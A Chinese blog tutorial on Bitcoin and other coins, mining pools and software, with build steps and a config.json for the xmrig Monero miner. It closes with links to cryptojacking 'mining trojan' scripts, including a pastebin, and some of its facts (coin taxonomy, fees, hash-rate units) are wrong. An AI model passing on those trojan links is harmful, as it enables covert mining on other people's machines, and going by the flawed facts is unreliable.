---
title: 比特币及其挖矿配置
---
<ClientOnly>
  <in-article-adsense
    ins-style="display:block; text-align:center;"
    data-ad-slot="7727965566"
  />
</ClientOnly>

[[toc]]

文档最新更新日期: **2020/07/07**

## 比特币（BTC）

比特币就像黄金，总量是固定的（**2100万个，到目前为止已经挖了1600多万个了，说是要挖到2140年，我也不知道咋算的**），我一个小老百姓，没有钱去倒卖黄金赚差价，只能自己拎锄头去挖矿了。


比特币基本算法，比特币每10分钟产生1个区块(block)，每个区块里有N个比特币作为报酬(N的数量在下文中说明)，这个区块包含了最近10分钟所有的比特币交易信息。

那么N是多少呢？根据比特币算法，在比特币发布之日起的头4年里，N = 基础报酬(50个比特币) + 交易报酬(过去10分钟内整个比特币网络耗费的交易手续费，前面已经说过，每笔比特币交易会消耗0.001比特币作为报酬给挖矿的人)，每隔4年，N的基础奖励将减少一半，也就是说，头4年为50，第5-8年为25，第9-12年为12.5，以此类推。而随着比特币越来越普及，交易越来越频繁，N的交易奖励会逐渐增加。


### 比特币白皮书

### 比特币种类

1. 比特币现金（BCH)

2. 以太坊（ETH）

以太坊一直是比特币竞争者中最接近的加密货币，由出色的俄罗斯程序员 Vitalik Buterin 和其团队于 2015 年创立，多年来，这种加密货币及其强大的区块链平台不断增加。 虽然可以将加密货币本身视为竞争对手，但它与比特币有很大不同，其为全球数千家公司和开发商提供服务的区块链本身就是一个完全不同的社区。 以太坊是一个去中心化的软件平台，它使智能合约和去中心化应用程序（DApp）成为更主流的东西，为欺诈控制和加密协议等引入了替代解决方案。 以太坊在 2019 年初下跌了 2017 年创下历史高点的 90% 以上。不过，该项目发展平稳，在 2019 年第一季度后收于高点，在第二季度以 142 美元的价格开始，第二季度是它全年表现最好的季度，就像比特币一样，反映出两种货币之间有一些相关性。 以太坊和其他加密货币的表现都与比特币有关，而且似乎不会在 2020 年结束。然而，我们可以满足于以太坊蓬勃发展的区块链平台和出色的市场估值，这足以证明加密货币将会存在。

3. 币安币（BNB）

Binance Coin 由 Binance 交易所于 2017 年创建和发行，即使在其存在的短时间内，其存量和潜力也在增加。当然，它的快速增长与它作为世界上最大的交易所之一的规模和影响力息息相关。 BNB 是在以太坊区块链上发行的 ERC20 代币，BNB 在 2019 年总体上取得了成功，但到年底仍处于一个相对低位。

在 2019 年初以微弱的 5.93 美元上涨之后，它在 6 月第二季度的 38.48 美元上稳步上升至 2019 年的历史新高。但是 2019 年底 BNB 以略高于 19 美元的价格收盘。

4. 泰达（USDT）

随着加密货币市场上流通的 USDT 超过 40 亿枚，其他稳定币甚至难以竞争，Tether 也是列表中唯一的稳定币，它是一种数字货币，以最常用的法定货币美元为基础。

特别是在 2018 年推出以来，该稳定币一直受到争议，但它不断打破纪录，尽管比其他代币出现晚一点，但仍主导了市场上的其他稳定币。 Tether 有时被称为“加密货币的中央银行”，其市值令人印象深刻且持续增长，目前已超过 46 亿美元，因此请密切注意其 2020 年的发展。

5.门罗币(XMR)
--------------------------------------------------------------------------------------------------------

## 教程

使用教程： https://zhuanlan.zhihu.com/p/114300968

矿机：最好理解吧，买来挖矿用的，现在比特币的话，蚂蚁矿机做的最大了

挖矿：挖矿是通过计算某个算式，得出某个结果，谁先算出来谁就可以打包区块，打包区块就有钱赚（比特币奖励+交易费）。

挖矿难度: 计算某个算式，得出某个结果的难度成为挖矿难度

矿池：如果理解挖矿的话，就可以理解矿池的意义，挖矿需要计算，而这个计算就是问题关键，如果自己买矿机自己算，按照概率，你有可能一个星期也算不出符合条件的结果，这样电费什么的费用你还要承担，风险很大。矿池的存在就是为了分担这个风险，矿池按照你的计算能力（主要是计算速度）把你应得的奖励按照固定的时间周期支付给你，这样就把风险转嫁到矿池本身了，矿工就不用承担运气风险了，当然矿池的利润也来自于此。

算力：简单说就是你的矿机运算速度的一个量化指标，比如1T算力，就是1s能算10的12次方次运算。如果这10的12次方次能算出符合条件的结果那就挖到了，如果没有，可以说是白算了

算力的单位： 
1kH/S: 每秒1000次hash算法 - one thousand
1MH/s：每秒100万次hash算法（1,000,000）- one million
1GH/s: 每秒10亿次hash算法（1,000,000,000 ） - one billion 
1TH/s: 每秒1兆次hash算法(1,000,000,000,000) - one trillion
1PH/s: 每秒1000京次hash算法（1,000,000,000,000,000） - one quadrillion
1EH/s: 每秒100垓次hash算法(1,000,000,000,000,000,000) - one quintillion

收益如何：挖矿的收益取决于自己的算力，全网算力和挖矿难度。自己拥有的算力越高，全网算力越低，挖矿难度越小 能挖到的币才越多

## 加密货币钱包

钱包主要分为：“冷”钱包、“热”钱包、软件钱包、纸钱包。“冷”钱包是完全离线状态；“热”钱包必须联网使用；软件钱包是基于本地的，但可以连接到互联网；至于纸钱包，可以是一张打印出来的纸，也可以是本地网络里的一个文件。实际上，每个钱包都有自己的优势和弊端。通常安全性与易用性之间存在一个杠杆，非常安全的钱包，用起来反而不方便，而极其易用的钱包，往往会有安全性方面的担忧。我曾体验过的几十种不同的钱包，本文里我会重点介绍几个比较好用的钱包给大家。选择钱包之前，你要确认自己对钱包的需求点。通常作为重点考虑因素的是：安全性、易用性、是否收费、设计风格、附加功能。

官网： https://bitcoin.org/zh_CN/choose-your-wallet

Windows环境： https://bitcoin.org/zh_CN/choose-your-wallet?step=5&platform=windows

bitcoin core使用方法：

1. 从上面的链接下载对应的Windows平台的安装包；
2. 安装完成后设置对应的数据保存目录，然后启动程序会自动下载所有的数据；


## 矿机

关于挖矿，简单来说你需要购买一台专用的计算设备，下载挖矿软件，就可以开始挖矿了。挖矿并不需要矿工亲自动手，实际是由电脑在执行特定的运算，矿工的任务是保证矿机的电力和网络连接就可以了。矿机的购买可以根据自己的需要选择合适的渠道，有需要的矿工朋友们可以咨询我们进行购买。在购买矿机时需要考虑：矿机的功耗，矿机的算力，单位功耗比，日产出，出厂厂商等等。

目前市场上，蚂蚁，神马，芯动，阿瓦隆，翼比特都有较良好的口碑，机型可以根据自己的实际情况和需求进行购买。

## 矿场

一般来说，大部分的矿工都不会选择在家挖矿，一是因为家庭用电的成本较高，二是因为矿机运作时会产生较大的噪音，影响生活作息。矿场因其电费成本较低，并有专人统一管理成为大多数人矿工首选的托管方式。所以，作为一名矿工，购买新机后，需要选择一个靠谱稳定的矿场。
自己有电资源就不用考虑了，如果需要找托管矿场（今年电价在0.27-0.4之间）的话，需要亲自考察电的属性 电价 稳定性 运维 停电的处理方式 维修等，提醒下这里水很深。
基本就这样，细节的东西也有，但是都不难。参与挖矿的核心不在于你懂不懂技术，也不是你有多大资本，而是电费。


## 交易网站

交易所：Binance，Huobi等

## 矿池

矿池排名： https://btc.com/

选择好矿场后，此时我们需要选择矿池。这里需要解释下为什么要选择矿池后再挖矿。在区块链早期，由于挖矿人数少，单台电脑每天也能获得收益。而随着全网算力不断上涨。独立挖矿的方式很快变得无利可图。于是在bitcointalk论坛上的Geek开发出一种将矿工联合起来，集中资源和按比例分享利润的系统，使用这种系统建立的网站被称为矿池。所以，为了追求利益的最大化，在目前的状况下，我们应该选择加入矿池。

矿池的选择根据自己的喜好，目前矿工选择较多的矿池为：币印，鱼池，蚂蚁矿池，http://btc.com。

网上说矿池是很多个单独的矿工组合在一起挖矿，以提高算力更快的挖矿。因为越往后，越来越难挖。难挖是真的难挖，但是我个人觉得，矿池的意义在于，它是一个路径，一个让你去挖矿的路径。还是拿黄金举例子，你现在钱包有了，你说你要去挖黄金了，去哪儿挖？诶，找个矿池，矿池会告诉你去哪儿挖

到这里，我要去找矿池，于是乎各大矿池出现了，什么鱼池，猫池，蚂蚁矿池等等等等，我就选了个鱼池，鱼池： https://www.f2pool.com/



## 挖矿软件

参考列表: http://www.wabi.com/soft?cate=all

软件名称 | 下载地址 | 支持币种 | 操作系统 | 费率  | 是否支持CPU,GPU
---------|----------|---------|---------|---------|---------
 **bminer**  | https://www.bminer.me/ | 比特币，笑脸币，以太币 | Window, **Linux**| 1%到2%费率不等 | AMD GPU深度优化
 **cgminer**   | https://github.com/ckolivas/cgminer | 比特币 | Linux | 开源免费
 **guiminer** | 已挂 | 已挂 | 已挂 | 已挂
 **cpuminer** | https://github.com/pooler/cpuminer | 莱特币，比特币 | Windows, Linux | 开源免费
 **xmrig**   | https://github.com/xmrig/xmrig | 门罗币 | Windows, Linux | 1%费率不等
 **xmr-Stak** | https://github.com/fireice-uk/xmr-stak | 门罗币 | 2%费率
 **minergate** | https://minergate.com/ | 门罗币 | Windows, Linux | 收取一定费用
 **Ethminer**  | https://github.com/ethereum-mining/ethminer | 以太币，以太经典币 |Windows,Linux | 开源免费
 **claymore** |停止更新 |claymore 以太币，以太经典币 |Windows,Linux | 收取2%费率
 **开源矿工NtMiner** | https://github.com/ntminer/NtMiner| 以太币，门罗币，笑脸币| Windows |开源免费
 **哈鱼矿工** | 前360团队 http://hashfish.net/ |以太币，门罗币 | Windows,Linux | 0抽水
 **轻松矿工** | http://www.qskg.top/ | 以太币 | Windows |
 **KKOS挖矿软件** | http://www.kkminer.com/#/ | 以太币，门罗币 | Windows, Linux | 定制返水


 ## 挖矿软件内核

币种 |算法| 类型|挖矿内核 | 矿池
---------|----------|---------|---------|---------
  **BTC比特币**|SHA256 |**ASIC挖矿** | cgminer | 
 **ETH/ETC 以太币** | ethhash| **显卡GPU挖矿** | Claymore 15.0,NBMiner 31.1, PhoenixMiner 5.0e, Teamredminer 0.7.3, GMiner   |
 **XMR门罗币** | CryptoNight，RandomX | **RandomX针对CPU优化，不支持GPU** | xmrigCpu 5.11.1, RagerX.lol, XMR-Stak-RX |
 **LTC莱特币** | Scrypt | 暂无 | 暂无


 ## 推荐挖矿软件

 1. 傻瓜式工具类，首推哈鱼矿工，其次开源矿工（以太币，门罗币）；
 2. 直接内核版，以太币因为是GPU显卡比较合适，推荐[Claymore](https://bitcointalk.org/index.php?topic=1433925.0)，也可以看看[minerOS矿工管家](www.mineros.cn)和[Bminer](https://www.bminer.me/releases/)，门罗币推荐xmrig和RagerX.lol。


 ## 推荐一键挖矿脚本

 1. Windows平台推荐使用~~哈鱼矿工(计费太少)~~和开源矿工，零费率。
 2. Linux平台推荐：
   
   - 门罗币： https://github.com/dovela/xmr-stak-auto/blob/master/OneClickMine.sh，注意要重新设置对应的费率问题
   - 门罗币：xmrig, https://zgao.top/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/


 所以推荐在打开Windows的时候就用哈鱼矿工挂着，它实际挖的是门罗币；
 然后在linux环境的时候参考https://blog.f2pool.com/zh/mining-tutorial/xmr，使用的是原版矿机：xmrig.

## Windows编译安装脚本xmrig

> 2020/05： MSVC2015/MSVC2017 and MSYS 32 bit now deprecated and will no longer updated. 以后只支持Windows的64版本，而且只能使用`MSVC2019/MSYS2 64bit`进行编译。

参考两个官方文档：
1. Windows脚本（推荐）： https://github.com/xmrig/xmrig/wiki/Windows-Build
2. Windows脚本依赖（可选）： https://github.com/xmrig/xmrig-deps


采用MSYS2编译没有成功，所以此处尝试采用Visual Studio 2019 企业版进行编译。操作步骤如下：

1. 下载对应的VS2019安装包： 百度网盘链接：<https://pan.baidu.com/s/1UhwRO6DMAsSrLxkx4bXqBA>，提取码：**ccp0**

2. 解压缩安装包，点击安装包文件： vs_professional2019.exe，按照提示进行安装，在进入选择组件对话框中勾选“桌面应用和移动应用”中的: `使用C++的桌面开发`和`通用Windows平台开发`,如下截图：
![20200710100206-2020-07-10](https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200710100206-2020-07-10.png)

在“其他工具集”中勾选：`使用C++的linux开发`，如下截图：
![20200710100351-2020-07-10](https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200710100351-2020-07-10.png)

其他的不用勾选。然后在语言包和安装位置中自己设置对应的语言和安装路径。

3. 点击右下角的“安装”按钮，等待十分钟左右完成所有的安装操作。

4. 将xmrig官方仓库的代码克隆到本地： 




--------------------------------------------------------------------------------------
载安装MSYS2（Minimal SYStem 2）。SYS2 是 MSYS 的一个升级版，准确的说是集成了 pacman 和 Mingw-w64 的 Cygwin 升级版，提供了bash shell 等 Linux 环境、版本控制软件（git/hg）和 MinGW-w64 工具链。与 MSYS 最大的区别是移植了 Arch Linux 的软件包管理系统 Pacman（其实是与Cygwin的区别）。

Cygwin,MSYS2,MinGW-w64等的区别： https://www.zhihu.com/question/22137175

编译脚本：

```
# 1. 下载安装msys2.
# 2. 配置MSYS2和mingw32，mingw64的镜像，否则下载很慢：https://www.cnblogs.com/CodeWorkerLiMing/p/12274583.html,
参考清华官方帮助文档： https://mirrors.tuna.tsinghua.edu.cn/help/msys2/
#3. 修改镜像后打开“MSYS2 MinGW 64-bit”执行如下命令更新镜像源

msys2使用pacman作为包管理器。同时，pacman也是ArchLinux上的包管理器。
所以我们使用 pacman 命令安装编译工具链
-S 表示保存，-Q 表示查询

# 更新本地软件包数据库
# pacman -Sy
# 然后升级软件包
# pacman -Syu
# pacman -Su
# 列出所有安装了的软件
$ pacman -Q --explicit
# 或者
$ pacman -Q -e
# 安装新的软件包
$ pacman -S <package_names|package_groups>

# 搜索软件包
$ pacman -Ss <name_pattern>

# 删除一个软件包
$ pacman -R <package_names|package_groups>


# pacman -S mingw-w64-x86_64-gcc
# pacman -S make
# pacman -S mingw-w64-x86_64-cmake
# pacman -S mingw-w64-x86_64-pkg-config

# git clone https://github.com/xmrig/xmrig.git
# git clone https://github.com/xmrig/xmrig-deps.git


```



## linux编译安装脚本xmrig

1. 编译xmrig免抽水： https://sunsea.im/ubuntu-debian-make-install-xmrig-config-hugepages.html
2. xmrig定制设置： https://www.cnblogs.com/heycomputer/articles/10235542.html

对应的挖矿命令：

```

# Install xmrig depends	，官方源码编译帮助文档： https://xmrig.com/docs/miner/ubuntu-build
$ sudo apt install -y software-properties-common git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev libhwloc-dev gcc g++ 
$ sudo apt install screen

$ git clone https://github.com/xmrig/xmrig.git
# 重设抽水
$ cd xmrig/src
$ nano donate.h
$ cd xmrig && mkdir build && cd build
# 1. 单独编译: Configure cmake scafolding
$ cmake ..
$ make -j$(nproc)
# 2. 编译可复制到其他电脑使用的版本
$ sudo apt-get install -y automake libtool autoconf
$ cd ../xmrig/scripts && ./build_deps.sh
$ cd ..
$ cd build
$ cmake .. -DXMRIG_DEPS=scripts/deps
$ make -j$(nproc)


# 调整 huge page,可以提高hashrate increase is 20-30%，https://xmrig.com/docs/miner/hugepages
# 1. 永久设置
$ nproc --all
$ sudo bash -c "echo vm.nr_hugepages=2 >> /etc/sysctl.conf"
# 2. 临时设置
# proc=`grep -c ^processor /proc/cpuinfo`
# cores=$((($proc+1)/2))
# num=$(($cores*3))
# /sbin/sysctl -w vm.nr_hugepages=`$num`

# 运行命令
# proc=`grep -c ^processor /proc/cpuinfo`
# percent=$((($proc-1)/$proc))
# hint = $percent*100
$ nohup ./xmrig --cpu-max-threads-hint 100 >/dev/null 2>&1 &
```

## 树莓派如何编译xmrig

直接编译会报如下错误：

```
[ 99%] Building CXX object CMakeFiles/xmrig.dir/src/base/net/https/HttpsServer.cpp.o
[100%] Linking CXX executable xmrig
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/opencl/OclWorker.cpp.o: in function `xmrig::OclWorker::consumeJob()':
OclWorker.cpp:(.text+0x3cc): undefined reference to `__atomic_load_8'
/usr/bin/ld: OclWorker.cpp:(.text+0x3fc): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/opencl/OclWorker.cpp.o: in function `xmrig::OclWorker::start()':
OclWorker.cpp:(.text+0x66c): undefined reference to `__atomic_load_8'
/usr/bin/ld: OclWorker.cpp:(.text+0x6d8): undefined reference to `__atomic_load_8'
/usr/bin/ld: OclWorker.cpp:(.text+0x6ec): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/opencl/OclWorker.cpp.o:OclWorker.cpp:(.text+0x728): more undefined references to `__atomic_load_8' follow
/usr/bin/ld: CMakeFiles/xmrig.dir/src/crypto/common/Nonce.cpp.o: in function `xmrig::Nonce::Nonce()':
Nonce.cpp:(.text+0x3c): undefined reference to `__atomic_store_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/crypto/common/Nonce.cpp.o: in function `xmrig::Nonce::stop()':
Nonce.cpp:(.text+0x1a0): undefined reference to `__atomic_store_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/crypto/common/Nonce.cpp.o: in function `xmrig::Nonce::touch()':
Nonce.cpp:(.text+0x1e0): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Worker.cpp.o: in function `xmrig::Worker::storeStats()':
Worker.cpp:(.text+0x90): undefined reference to `__atomic_store_8'
/usr/bin/ld: Worker.cpp:(.text+0xbc): undefined reference to `__atomic_store_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Worker.cpp.o: in function `xmrig::Worker::timestamp() const':
Worker.cpp:(.text._ZNK5xmrig6Worker9timestampEv[_ZNK5xmrig6Worker9timestampEv]+0x8): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Worker.cpp.o: in function `xmrig::Worker::hashCount() const':
Worker.cpp:(.text._ZNK5xmrig6Worker9hashCountEv[_ZNK5xmrig6Worker9hashCountEv]+0x8): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CpuLaunchData>::stop()':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13CpuLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_13CpuLaunchDataEE4stopEv]+0x20): undefined reference to `__atomic_store_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_13CpuLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_13CpuLaunchDataEE4stopEv]+0x9c): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CpuLaunchData>::tick(unsigned long long)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13CpuLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_13CpuLaunchDataEE4tickEy]+0x38): undefined reference to `__atomic_load_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_13CpuLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_13CpuLaunchDataEE4tickEy]+0x5c): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::OclLaunchData>::stop()':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13OclLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_13OclLaunchDataEE4stopEv]+0x20): undefined reference to `__atomic_store_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_13OclLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_13OclLaunchDataEE4stopEv]+0xdc): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::OclLaunchData>::tick(unsigned long long)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13OclLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_13OclLaunchDataEE4tickEy]+0x38): undefined reference to `__atomic_load_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_13OclLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_13OclLaunchDataEE4tickEy]+0x5c): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CudaLaunchData>::stop()':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_14CudaLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_14CudaLaunchDataEE4stopEv]+0x20): undefined reference to `__atomic_store_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_14CudaLaunchDataEE4stopEv[_ZN5xmrig7WorkersINS_14CudaLaunchDataEE4stopEv]+0x9c): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CudaLaunchData>::tick(unsigned long long)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_14CudaLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_14CudaLaunchDataEE4tickEy]+0x38): undefined reference to `__atomic_load_8'
/usr/bin/ld: Workers.cpp:(.text._ZN5xmrig7WorkersINS_14CudaLaunchDataEE4tickEy[_ZN5xmrig7WorkersINS_14CudaLaunchDataEE4tickEy]+0x5c): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CpuLaunchData>::start(std::vector<xmrig::CpuLaunchData, std::allocator<xmrig::CpuLaunchData> > const&)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13CpuLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE[_ZN5xmrig7WorkersINS_13CpuLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE]+0xd8): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::OclLaunchData>::start(std::vector<xmrig::OclLaunchData, std::allocator<xmrig::OclLaunchData> > const&)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_13OclLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE[_ZN5xmrig7WorkersINS_13OclLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE]+0x200): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/common/Workers.cpp.o: in function `xmrig::Workers<xmrig::CudaLaunchData>::start(std::vector<xmrig::CudaLaunchData, std::allocator<xmrig::CudaLaunchData> > const&)':
Workers.cpp:(.text._ZN5xmrig7WorkersINS_14CudaLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE[_ZN5xmrig7WorkersINS_14CudaLaunchDataEE5startERKSt6vectorIS1_SaIS1_EE]+0xd8): undefined reference to `__atomic_fetch_add_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o: in function `xmrig::CpuWorker<1u>::allocateRandomX_VM()':
CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj1EE18allocateRandomX_VMEv[_ZN5xmrig9CpuWorkerILj1EE18allocateRandomX_VMEv]+0x70): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o: in function `xmrig::CpuWorker<2u>::allocateRandomX_VM()':
CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj2EE18allocateRandomX_VMEv[_ZN5xmrig9CpuWorkerILj2EE18allocateRandomX_VMEv]+0x70): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o: in function `xmrig::CpuWorker<3u>::allocateRandomX_VM()':
CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj3EE18allocateRandomX_VMEv[_ZN5xmrig9CpuWorkerILj3EE18allocateRandomX_VMEv]+0x70): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o: in function `xmrig::CpuWorker<4u>::allocateRandomX_VM()':
CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj4EE18allocateRandomX_VMEv[_ZN5xmrig9CpuWorkerILj4EE18allocateRandomX_VMEv]+0x70): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o: in function `xmrig::CpuWorker<5u>::allocateRandomX_VM()':
CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj5EE18allocateRandomX_VMEv[_ZN5xmrig9CpuWorkerILj5EE18allocateRandomX_VMEv]+0x70): undefined reference to `__atomic_load_8'
/usr/bin/ld: CMakeFiles/xmrig.dir/src/backend/cpu/CpuWorker.cpp.o:CpuWorker.cpp:(.text._ZN5xmrig9CpuWorkerILj1EE10consumeJobEv[_ZN5xmrig9CpuWorkerILj1EE10consumeJobEv]+0x14): more undefined references to `__atomic_load_8' follow
collect2: error: ld returned 1 exit status
make[2]: *** [CMakeFiles/xmrig.dir/build.make:3195：xmrig] 错误 1
make[1]: *** [CMakeFiles/Makefile2:74：CMakeFiles/xmrig.dir/all] 错误 2
make: *** [Makefile:84：all] 错误 2


```

1. 可能的cmake命令切换错误，[树莓派编译armv8l make error (using _x86 instead of _arm) 错误](https://github.com/xmrig/xmrig/issues/744)

2. 查看树莓派对应的gcc/g++ 版本，命令: `gcc -v /g++ -v`, 确认不是gcc版本问题
一个已经编译好的树莓派xmrig: https://github.com/auto-joe/rPi-xmrig-gcc7.3.0
树莓派编译GCC7: https://solarianprogrammer.com/2017/12/07/raspberry-pi-raspbian-compiling-gcc/

3. 可能是架构不支持，需要将树莓派切换成64位机器，参考问题说明： https://github.com/xmrig/xmrig/issues/1446
需要用到的脚本如下：

```
$ sudo apt install -y debootstrap schroot
$ cat << EOF | sudo tee /etc/schroot/chroot.d/pi64
[pi64]
description=VC4 arm64 testing
type=directory
directory=/srv/chroot/pi64
users=pi
root-groups=root
profile=desktop
personality=linux
preserve-environment=true
EOF
$ sudo debootstrap --arch arm64 stable /srv/chroot/pi64
$ sudo schroot -c pi64 -- apt install -y sudo gcc libssl-dev libuv1-dev libnuma-dev libhwloc-dev cmake

$ schroot -c pi64

```



## xmrig配置及其脚本

1. 官方提供了一个有关该配置文件的在线配置： https://xmrig.com/wizard
2. 学习文档: https://xmrig.com/docs, https://github.com/xmrig/xmrig/tree/master/doc

其中重要的config.json文件内容(下载官方的默认配置文件: https://github.com/xmrig/xmrig/blob/master/src/config.json)，主要修改如下几个配置：

- `cpu`部分的参数: `max-threads-hint` 控制占用的cpu内存大小，`priority`设置在空闲的时候进行运行。其中0 idle, 2 normal to 5 highest。
   添加一个配置`rx/0`,配置参数为: `[0,1,2,3]`
- `opencl`部分的参数：`enabled`改为`true`.
- `cuda`部分的参数: `enabled`改为`true`.
- `donate-level`改为0.
- `pools`部分的参数： `coin`改为: `monero`表示门罗币，`url`改为鱼池矿池地址：`xmr.f2pool.com:13531`, `user`设置为： `84YikQQa894Grw3Kcsb3GbDaKsY2CciqUC4xeBCPQWqggncrQUNBtV4dZDwdQAcfrTZ32GijR8Ws7EuuAC5bhJG7FdTHFfy.001`, `pass`是默认的值，不用修改设置为: `x`, `nicehash`设置为: `false`, `keepalive`设置为: `true`, `enable`设置为: `true`, `tls`设置为: `false`, `daemon`一定要设置为: `false`. 然后复制该份配置设置其他的多个矿池避免出错。

```
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": 0,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 50,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "cn/0": false,
        "cn-lite/0": false,
        "kawpow": false
    },
    "opencl": {
        "enabled": true,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": true,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": "monero",
            "url": "stratum+tcp://xmr.f2pool.com:13531",
            "user": "84YikQQa894Grw3Kcsb3GbDaKsY2CciqUC4xeBCPQWqggncrQUNBtV4dZDwdQAcfrTZ32GijR8Ws7EuuAC5bhJG7FdTHFfy.001",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
        {
            "algo": null,
            "coin": "monero",
            "url": "stratum+tcp://xmr.antpool.com:9005",
            "user": "84YikQQa894Grw3Kcsb3GbDaKsY2CciqUC4xeBCPQWqggncrQUNBtV4dZDwdQAcfrTZ32GijR8Ws7EuuAC5bhJG7FdTHFfy",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true
}

```

可以采用CPU,GPU或者CUDA进行挖矿.

## 挖矿木马

1. 门罗币木马脚本： https://yq.aliyun.com/articles/637475
2. 挖矿木马脚本： https://pastebin.com/X2EK5LXb
